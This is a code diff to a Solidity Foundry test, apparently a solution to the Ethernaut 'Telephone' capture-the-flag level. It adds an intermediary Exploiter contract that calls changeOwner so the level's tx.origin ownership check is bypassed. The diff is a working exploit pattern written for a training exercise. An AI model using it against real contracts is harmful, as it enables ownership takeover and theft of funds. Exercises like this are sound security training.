@@ -37,6 +37,14 @@ contract TestTelephone is BaseTest {
         /** CODE YOUR EXPLOIT HERE */
 
         vm.startPrank(player, player);
+        Exploiter exploiter = new Exploiter();
+        exploiter.callChangeOwner(level);
         vm.stopPrank();
+    }
+}
+
+contract Exploiter {
+    function callChangeOwner(Telephone level) public {
+        level.changeOwner(msg.sender);
     }
 }
